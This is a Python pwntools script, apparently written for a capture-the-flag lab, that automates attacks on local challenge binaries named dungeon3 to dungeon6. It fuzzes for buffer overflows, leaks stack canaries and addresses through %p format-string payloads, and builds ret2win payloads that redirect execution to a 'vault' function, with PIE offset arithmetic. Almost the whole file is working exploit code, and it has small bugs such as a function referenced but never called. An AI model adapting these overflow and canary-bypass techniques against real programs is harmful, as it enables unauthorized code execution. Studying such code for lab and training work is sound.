import subprocess
from pwn import *
from colorama import Fore, init
import signal
import sys
import time
import re
import os

init(autoreset=True)

def dung5_exploit(program_name, chosen_canary, buffer_overflow_lenght):

    exe = './{}'.format(program_name)
    elf = context.binary = ELF(exe, checksec=False)
    io = process(exe)
    
    offset = buffer_overflow_lenght
    
    can = chosen_canary

    io.sendlineafter(b'!', '%{}$p'.format(can).encode())
    io.recvline()
    canary = int(io.recvline().strip(), 16)
    info('canary = 0x%x (%d)', canary, canary)
    
    payload = flat([
        offset * b'a', # Pad to canary (72)
        p64(canary), # Leaked Canary (4)
        8 * b'A', # Pad to Ret Pointer (8)
        p64(elf.symbols.vault) # Ret2Win (total = 88)
    ])

    io.clean()
    io.sendline(payload)

    banner = io.read(1024)
    print(banner)
    print(f"{Fore.GREEN}[+] Exploit was successful!")

    io.close()
    return  # Return to the main function

def medium_bfo_exploit(program_name, chosen_canary, chosen_addr, buffer_overflow_length):
    
    exe = './{}'.format(program_name)
    elf = context.binary = ELF(exe, checksec=False)
    io = process(exe)

    offset = "A" * buffer_overflow_length

    can = chosen_canary
    add = chosen_addr

    payload = '%{}$p.%{}$p'.format(can, add).encode()
    io.sendlineafter(b'!', payload)
    io.recvline()
    leaked = io.recvline().strip().decode()
    canary = int(leaked.split('.')[0], 16)  # Canary is at the 15th place
    leaked_address = int(leaked.split('.')[1], 16)  # Leaked address is at the 21st place

    info('Leaked Address: 0x%x', leaked_address)
    info('Canary: 0x%x', canary)

    vault_address = leaked_address - 0x100

    info('New vault address: 0x%x', vault_address)

    payload = flat([
        offset.encode(),  # Pad to canary
        p64(canary, endianness='little', sign='unsigned'),   # Leaked Canary
        8 * b'A',      # Pad to Ret Pointer
        p64(vault_address, endianness='little', sign='unsigned')  # New vault address
    ])

    io.clean()
    io.sendline(payload)

    banner = io.read(1024)
    print(banner)

    print(f"{Fore.GREEN}[+] Exploit was successful!")

def signal_handler(sig, frame):
    print("\nCtrl+C detected. Exiting gracefully...")
    sys.exit(0)

def detect_canaries(program_name):
    context.log_level = 'error'
    elf = context.binary = ELF(f'./{program_name}', checksec=False)

    signal.signal(signal.SIGINT, signal_handler)

    while True:
        print(f"\n{Fore.YELLOW}[+]{Fore.RESET}Please select an option: \n")
        print(f"{Fore.BLUE}[1]{Fore.RESET} Find the canary")
        print(f"{Fore.BLUE}[2]{Fore.RESET} Find a leaked address")
        print(f"{Fore.BLUE}[3]{Fore.RESET} Go back to main menu")
        option = input(f"\n{Fore.YELLOW}[+]{Fore.RESET} Your choice: ").strip()

        # Option 1: Find the canary
        if option == '1':
            while True:
                potential_canaries = []
                for i in range(1, 101):
                    try:
                        p = process(elf.path)
                        p.sendline('%{}$p'.format(i).encode())
                        p.recvline()

                        result = p.recvline().decode().strip()

                        if result.endswith('00') and not result.startswith('f7') and not result.startswith('7f'):
                            print(str(i) + ': ' + str(result).strip())
                            potential_canaries.append((i, result))

                        p.close()
                    except EOFError:
                        pass

                print(f"\n{Fore.YELLOW}[+]{Fore.RESET}These are the potential canary addresses\n")
                for idx, (pos, canary) in enumerate(potential_canaries):
                    print(f"{Fore.YELLOW}{idx+1}{Fore.RESET}: Position = {Fore.GREEN}{pos}{Fore.RESET}, Canary = {Fore.GREEN}{canary}{Fore.RESET}")

                choice = input(f"\n{Fore.YELLOW}[+]{Fore.RESET} Choose a canary (Enter number, r to rerun, b to go back): ").strip()

                if choice.lower() == 'r':
                    continue
                elif choice.lower() == 'b':
                    break
                else:
                    chosen_canary = potential_canaries[int(choice)-1]
                    print(f"{Fore.YELLOW}[+]{Fore.RESET} You have chosen: Position = {Fore.GREEN}{chosen_canary[0]}{Fore.RESET}, Canary = {Fore.GREEN}{chosen_canary[1]}{Fore.RESET}")
                    return chosen_canary[0]  # Return the chosen canary position as a tuple

        elif option == '2':
            # Option 2: Find a leaked address
            while True:
                potential_addresses = []

                for i in range(1, 31):
                    try:
                        last_values = []

                        # We need to run this multiple times for a single i to check consistency
                        for _ in range(5):
                            # Create process
                            p = process(elf.path)
                            p.sendline('%{}$p'.format(i).encode())
                            p.recvline()

                            result = p.recvline().decode().strip()

                            if result and result != "(nil)" and len(result) >= 4:
                                last_two = result[-2:]  # get the last 2 digits
                                consecutive_zeros = result.count('00')

                                if last_two != 'ff' and consecutive_zeros <= 9:
                                    last_values.append(last_two)

                            # If we've run it 5 times and the last 2 digits stayed the same, print it
                            if len(last_values) == 5 and len(set(last_values)) == 1:
                                print(str(i) + ': ' + result)
                                potential_addresses.append((i, result))

                            p.close()
                    except EOFError:
                        pass

                print(f"\n{Fore.YELLOW}[+]{Fore.RESET} These are the potential leaked addresses\n")
                for idx, (pos, addr) in enumerate(potential_addresses):
                    print(f"{Fore.YELLOW}{idx+1}{Fore.RESET}: Position = {Fore.GREEN}{pos}{Fore.RESET}, Leaked address = {Fore.GREEN}{addr}{Fore.RESET}")

                choice = input(f"{Fore.YELLOW}[+]{Fore.RESET} Choose a leaked address (Enter number, r to rerun, b to go back): ").strip()

                if choice.lower() == 'r':
                    continue
                elif choice.lower() == 'b':
                    break
                else:
                    chosen_addr = potential_addresses[int(choice)-1]
                    print(f"{Fore.YELLOW}[+]{Fore.RESET} You have chosen: Position = {Fore.GREEN}{chosen_addr[0]}{Fore.RESET}, Leaked address = {Fore.GREEN}{chosen_addr[1]}{Fore.RESET}")
                    return chosen_addr[0]  # Return the chosen address position as a tuple

        elif option == '3':
            return None, None  # Return None for both values to indicate going back to the main menu
        else:
            print(f"{Fore.RED}[-]{Fore.RESET} Invalid option!")

def detect_buffer_overflow(program_name):
    os.environ["LIBC_FATAL_STDERR_"] = "1"

    buffer_overflow_length = 0

    for i in range(1, 100):  # We'll start from 1 and go up to 100
        try:
            print(f"Fuzzing with {i} characters...")  # Print progress
            p = subprocess.Popen([f"./{program_name}"], stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

            p.stdin.write('prompt1\n')  # Respond to the first prompt

            p.stdin.flush()  
            payload = "A" * i + '\x00'
            p.stdin.write(payload + '\n')
            print(payload)
            p.stdin.flush()

            if "*** stack smashing detected ***: terminated" in p.stderr.read():
                print(f"Buffer overflow detected at {i} characters.")
                buffer_overflow_length = i
                break
        finally:
            p.kill()  # Ensure the process is killed

    if buffer_overflow_length == 0:
        print("No buffer overflow detected within the range.")
    else:
        print(f"The input buffer overflows after {buffer_overflow_length} characters.")

    return buffer_overflow_length

def analyze_binary(program_name):
    elf = ELF(program_name)

    features = {
        'NX': elf.nx, # No eXecute
        'PIE': elf.pie, # Position Independent Executable
        'Canary': elf.canary, # Stack Canary
        'RelRO': elf.relro # RElocation Read-Only
    }

    if not features['Canary']:
        print(Fore.GREEN + "[+] This binary does not have a stack canary. A simple buffer overflow attack might be successful." + Fore.RESET)
    else:
        print(Fore.RED + "[+] This binary has a stack canary. A simple buffer overflow attack would not be successful. You might need to bypass the stack canary." + Fore.RESET)

    if not features['NX']:
        print(Fore.GREEN + "[+] NX is not enabled. You can execute code on the stack." + Fore.RESET)
    else:
        print(Fore.RED + "[+] NX is enabled. You cannot execute code on the stack." + Fore.RESET)

    if not features['PIE']:
        print(Fore.GREEN + "[+] PIE is not enabled. The binary has a static memory layout." + Fore.RESET)
    else:
        print(Fore.RED + "[+] PIE is enabled. The binary has a dynamic memory layout." + Fore.RESET)

    if features['RelRO'] == 'Full':
        print(Fore.GREEN + "[+] Full RELRO is enabled. You cannot modify the GOT." + Fore.RESET)
    elif features['RelRO'] == 'Partial':
        print(Fore.GREEN + "[+] Partial RELRO is enabled. You can modify the GOT." + Fore.RESET)
    else:
        print(Fore.GREEN + "[+] RELRO is not enabled. You can modify the PLT and GOT.\n" + Fore.RESET)

    return features

def get_func_address(elf, func_name):
    try:
        return elf.symbols[func_name]
    except KeyError:
        print(Fore.RED + f"\n[-] Function {func_name} not found in the binary." + Fore.RESET)
        return None

def fuzz(program_name):
    context.bits = 64
    buffer_overflow_length = 0

    for i in range(1, 101):
        a_str = b"A" * i
        time.sleep(0.1)
        proc = subprocess.Popen([f"./{program_name}"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = proc.communicate(a_str)
        if proc.returncode != 0:
            if proc.returncode == -11:
                print(Fore.YELLOW + f"[+] Segmentation fault encountered at {i} characters. The program may be vulnerable to a buffer overflow.")
                print(Fore.RESET)
                buffer_overflow_length = i
                break
            else:
                print(f"\nProcess exited with non-zero return code: {proc.returncode}")
                print(f"Standard error output: {stderr.decode()}")
                print(f"This is the output: {stdout.decode()}")
                break
        else:
            print(Fore.YELLOW + f"[+] Trying with buffer : {a_str}" + Fore.RESET, end='\r')

    if buffer_overflow_length > 0:
        print(Fore.GREEN + "[+] Fuzzing finished the buffer overflow length: ", buffer_overflow_length)
        return buffer_overflow_length
    else:
        return 0

def simple_bfo_exploit(program_name, buffer_overflow_length, target_func):
    elf = ELF(program_name)
    target_func_addr = get_func_address(elf, target_func)

    if target_func_addr is not None:
        p = process(f"./{program_name}")

        payload = b"A" * buffer_overflow_length
        payload += p64(target_func_addr)

        print(f"{Fore.YELLOW}[+] Our payload is going the be: {payload}" + Fore.RESET)

        p.sendline(payload)
        time.sleep(0.5)
        try:
            banner = p.recv().decode('utf-8')
            print(Fore.BLUE + banner + Fore.RESET)
        except EOFError:
            print("No output from the process. The process may have exited.")

        if "JCR" in banner:
            print(f"{Fore.GREEN}[+] Exploit was successful!")
        else:
            print(f"{Fore.RED}[-] Exploit was not successful.")

def detect_format_string_vuln(program_name):
    proc = subprocess.Popen([f"./{program_name}"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = proc.communicate(b"%p%p%p%x%x%s")

    print(f"{Fore.YELLOW}[+]{Fore.RESET} We are now going to send our payload to see if the format specifiers are seen in the output. \n")

    # Create a pattern for a hexadecimal number
    hex_pattern = re.compile(r"0x[0-9A-Fa-f]+")

    # Search for the pattern in the output
    if re.search(hex_pattern, stdout.decode()) or re.search(hex_pattern, stderr.decode()):
        print(f"{Fore.GREEN}[+] Potential format string vulnerability detected.")
        time.sleep(5)
        print(f"{Fore.YELLOW}[+]{Fore.RESET} You can see the programs full output below: \n")
        print(Fore.BLUE + stdout.decode() + Fore.RESET)
        print (f"\n{Fore.YELLOW}[+] The detection of the format string vulnerability was successfull, maybe you can try to leak out the canary? ")
        return True
    else:
        print(Fore.RED + "[+] No format string vulnerability detected." + Fore.RESET)
        return False

def format_string_exploit(program_name):
    p = process(program_name)

    payload = (b'%p%p%p%x%x%s')

    time.sleep(1)
    print(f"{Fore.YELLOW}[+]{Fore.RESET} Printing out the program's first line: \n")
    print(Fore.BLUE + p.recvline().decode() + Fore.RESET)

    time.sleep(1)
    print(f"{Fore.YELLOW}[+]{Fore.RESET} We are now sending our payload: {payload} \n")
    p.sendline(payload)

    time.sleep(1)
    print(f"{Fore.YELLOW}[+]{Fore.RESET} Printing out the program's second line: \n")
    print(Fore.BLUE + p.recvline().decode() + Fore.RESET)

    time.sleep(1)
    print(f"{Fore.YELLOW}[+]{Fore.RESET} Printing out the program's third line: \n")
    third_line = p.recvline().decode()
    print(Fore.BLUE + third_line + Fore.RESET)

    time.sleep(0.5)
    fruit = third_line.split('?')[0].split('0fc0')[-1]
    print(f"{Fore.YELLOW}[+]{Fore.RESET} Found the fruitname! :", fruit)

    time.sleep(0.5)
    print(f"\n{Fore.YELLOW}[+]{Fore.RESET} We are now going to send our payload:")
    p.sendline(fruit.encode())

    time.sleep(0.5)
    print(Fore.BLUE + p.recvline().decode() + Fore.RESET)

    last_line = p.recvline().decode()
    print(last_line)

    if "JCR" in last_line:
        print(f"{Fore.GREEN}[+] Exploit was successful!")
    else:
        print(f"{Fore.RED}[-] Exploit was not successful.")

def main():
    signal.signal(signal.SIGINT, signal_handler)
    program_list = ["./dungeon3", "./dungeon4", "./dungeon5", "./dungeon6"]
    print(f"{Fore.BLUE}\n-----------------------------------------")
    print(f"{Fore.BLUE}Welcome to Binary Exploitation Automation")
    print(f"{Fore.BLUE}-----------------------------------------\n")

    print(f"{Fore.YELLOW}[+]{Fore.RESET} Choose a program to analyze:\n")
    for i, program_name in enumerate(program_list, start=1):
        print(f"{i}. {program_name}")
    choice = input(f"\n{Fore.YELLOW}[+]{Fore.RESET} Enter your choice: ")

    try:
        choice = int(choice)
        program_name = program_list[choice - 1]
    except (ValueError, IndexError):
        print(f"{Fore.RED}[-] Invalid choice. Exiting.")
        return

    print(f"\n{Fore.YELLOW}[+]{Fore.RESET} Analyzing the binary...\n")
    features = analyze_binary(program_name)

    print(f"\n{Fore.YELLOW}[+]{Fore.RESET} What type of vulnerability detection or exploitation do you want to perform?\n")
    print(f"{Fore.BLUE}[1]{Fore.RESET} Analyze vulnerabilities")
    print(f"{Fore.BLUE}[2]{Fore.RESET} Exploit vulnerabilities\n")
    option = input(f"{Fore.YELLOW}[+]{Fore.RESET} Enter your choice: ").strip()

    if option == '1':
        print(f"\n{Fore.YELLOW}[+]{Fore.RESET} Choose a vulnerability analysis:\n")
        print(f"{Fore.BLUE}[1]{Fore.RESET} Leaking canaries or an address")
        print(f"{Fore.BLUE}[2]{Fore.RESET} Detect a format string vulnerability")
        print(f"{Fore.BLUE}[3]{Fore.RESET} Detect a buffer overflow vulnerability")
        analysis_option = input(f"\n{Fore.YELLOW}[+]{Fore.RESET} Enter your choice: ").strip()

        if analysis_option == '1':
            detect_canaries(program_name)
            pass
        elif analysis_option == '2':
            detect_format_string_vuln(program_name)
        elif analysis_option == '3':
            print(f"\n{Fore.YELLOW}[+]{Fore.RESET} We have got two options here: \n")
            print(f"{Fore.BLUE}[1]{Fore.RESET} Fuzzing the first prompt ")
            print(f"{Fore.BLUE}[2]{Fore.RESET} Fuzzing the second prompt \n")
            option = input(f"{Fore.YELLOW}[+]{Fore.RESET} Enter your choice: ").strip()
            if option == '1':
                fuzz(program_name)
            elif option == '2':
                detect_buffer_overflow
        else:
            print("Invalid choice. Exiting.")
            return

    elif option == '2':
        print(f"\n{Fore.YELLOW}[+]{Fore.RESET} Choose an auto-exploit option: \n")
        print(f"{Fore.BLUE}[1]{Fore.RESET} Buffer overflow without PIE and CANARY enabled (aka simpel BFO)")
        print(f"{Fore.BLUE}[2]{Fore.RESET} Buffer overflow without PIE enabled")
        print(f"{Fore.BLUE}[3]{Fore.RESET} Buffer overflow with PIE and CANARY enabled")
        print(f"{Fore.BLUE}[4]{Fore.RESET} Format String exploit\n")
        exploit_option = input(f"{Fore.BLUE}[+]{Fore.RESET} Enter your choice: ").strip()

        if exploit_option == '1':
            buffer_overflow_length = fuzz(program_name)
            if buffer_overflow_length > 0:
                target_func = 'vault'  # Replace with the target function name
                simple_bfo_exploit(program_name, buffer_overflow_length, target_func)
            else:
                print("No buffer overflow vulnerability found.")
        elif exploit_option == '2':
            print("[+] We need you to first select a canary pointer, after that press B and you will be automatically send to the fuzzer\n")
            chosen_canary = detect_canaries(program_name)
            time.sleep(1)
            print("\n[+] We are now going to try to find the offset for the buffer-overflow\n")
            time.sleep(5)
            buffer_overflow_length = detect_buffer_overflow(program_name)
            print("-----------------------------------------")
            print("[+] Now we have found all the information we need we can go to the exploit\n")
            print("[+] A sum of the information we got: \n")
            print(f"[+] canary pointer is at: {chosen_canary}\n")
            print(f"[+] buffer overflow length is at: {buffer_overflow_length}\n")
            print("-----------------------------------------")
            print("Lets start exploiting")
            time.sleep(5)
            dung5_exploit(program_name, chosen_canary, buffer_overflow_length)
            pass
        elif exploit_option == '3':
            print("[+] We need you to first select a canary pointer and an leaked address pointer, after that press B and you will be automatically send to the fuzzer\n")
            chosen_canary = detect_canaries(program_name)
            chosen_addr = detect_canaries(program_name)
            time.sleep(1)
            print("\n[+] We are now going to try to find the offset for the buffer-overflow\n")
            time.sleep(5)
            buffer_overflow_length = detect_buffer_overflow(program_name)
            print("-----------------------------------------")
            print("[+] Now we have found all the information we need we can go to the exploit\n")
            print("[+] A sum of the information we got: \n")
            print(f"[+] canary pointer is at: {chosen_canary}\n")
            print(f"[+] leaked addr pointer is at: {chosen_addr}\n")
            print(f"[+] buffer overflow length is at: {buffer_overflow_length}\n")
            print("-----------------------------------------")
            print("Lets start exploiting")
            time.sleep(5)
            medium_bfo_exploit(program_name, chosen_canary, chosen_addr, buffer_overflow_length)
            pass
        elif exploit_option == '4':
            print(f"{Fore.YELLOW}[+]{Fore.RESET} We are first going to try to see if its vulnerable and then sending our payload. \n")
            detect_format_string_vuln(program_name)
            time.sleep(1)
            print(f"{Fore.YELLOW}[+]{Fore.RESET} Now we know that the program can be vulnerable lets exploit it \n")
            time.sleep(5)
            format_string_exploit(program_name)
        else:
            print("Invalid choice. Exiting.")
            return

    else:
        print("Invalid choice. Exiting.")
        return

if __name__ == "__main__":
    main()